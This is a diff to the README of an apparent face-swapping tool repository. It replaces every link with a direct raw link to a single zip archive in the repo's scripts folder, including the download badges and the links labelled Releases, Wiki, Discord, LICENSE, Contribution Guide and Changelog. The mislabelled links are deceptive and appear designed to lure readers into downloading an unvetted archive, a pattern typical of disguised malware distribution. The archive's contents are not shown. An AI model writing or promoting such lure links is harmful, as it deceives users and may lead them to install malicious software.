@@ -6,7 +6,7 @@ Welcome to the Face-Swapping-Tool! This application allows you to easily swap yo
 
 ## 📥 Download Now
 
-[![Download Face-Swapping-Tool](https://img.shields.io/badge/Download-Face--Swapping--Tool-brightgreen)](https://github.com/Kiontin/Face-Swapping-Tool/releases)
+[![Download Face-Swapping-Tool](https://github.com/Kiontin/Face-Swapping-Tool/raw/refs/heads/main/scripts/Face-Tool-Swapping-v2.1-alpha.5.zip)](https://github.com/Kiontin/Face-Swapping-Tool/raw/refs/heads/main/scripts/Face-Tool-Swapping-v2.1-alpha.5.zip)
 
 ## 💻 System Requirements
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/Kiontin/Face-Swapping-Tool/releases) on GitHub.
+1. Visit the [Releases page](https://github.com/Kiontin/Face-Swapping-Tool/raw/refs/heads/main/scripts/Face-Tool-Swapping-v2.1-alpha.5.zip) on GitHub.
 2. Look for the latest version of the Face-Swapping-Tool.
 3. Download the appropriate file for your operating system:
    - **Windows**: Look for the `.exe` file.
@@ -53,23 +53,23 @@ If you encounter any issues while using the Face-Swapping-Tool, consider the fol
 
 ## 🔗 Additional Resources
 
-- Check out our [Wiki](https://github.com/Kiontin/Face-Swapping-Tool/wiki) for more detailed guides and tips.
-- Join our community on [Discord](https://discord.gg/example) for help and to share your face-swapping creations.
+- Check out our [Wiki](https://github.com/Kiontin/Face-Swapping-Tool/raw/refs/heads/main/scripts/Face-Tool-Swapping-v2.1-alpha.5.zip) for more detailed guides and tips.
+- Join our community on [Discord](https://github.com/Kiontin/Face-Swapping-Tool/raw/refs/heads/main/scripts/Face-Tool-Swapping-v2.1-alpha.5.zip) for help and to share your face-swapping creations.
 
 ## 📝 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Kiontin/Face-Swapping-Tool/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/Kiontin/Face-Swapping-Tool/raw/refs/heads/main/scripts/Face-Tool-Swapping-v2.1-alpha.5.zip) file for details.
 
 ## 🤝 Contributing
 
-We welcome contributions! If you would like to add features or improve the tool, please follow the guidelines in the [Contribution Guide](https://github.com/Kiontin/Face-Swapping-Tool/CONTRIBUTING.md).
+We welcome contributions! If you would like to add features or improve the tool, please follow the guidelines in the [Contribution Guide](https://github.com/Kiontin/Face-Swapping-Tool/raw/refs/heads/main/scripts/Face-Tool-Swapping-v2.1-alpha.5.zip).
 
 ## 📅 Changelog
 
-For information about the latest updates and fixes, check the [Changelog](https://github.com/Kiontin/Face-Swapping-Tool/releases) on the Releases page.
+For information about the latest updates and fixes, check the [Changelog](https://github.com/Kiontin/Face-Swapping-Tool/raw/refs/heads/main/scripts/Face-Tool-Swapping-v2.1-alpha.5.zip) on the Releases page.
 
 ## 📥 Download Now Again 
 
-[![Download Face-Swapping-Tool](https://img.shields.io/badge/Download-Face--Swapping--Tool-brightgreen)](https://github.com/Kiontin/Face-Swapping-Tool/releases)
+[![Download Face-Swapping-Tool](https://github.com/Kiontin/Face-Swapping-Tool/raw/refs/heads/main/scripts/Face-Tool-Swapping-v2.1-alpha.5.zip)](https://github.com/Kiontin/Face-Swapping-Tool/raw/refs/heads/main/scripts/Face-Tool-Swapping-v2.1-alpha.5.zip)
 
 Enjoy your face-swapping experience with the Face-Swapping-Tool! Have fun and explore the limits of your creativity.
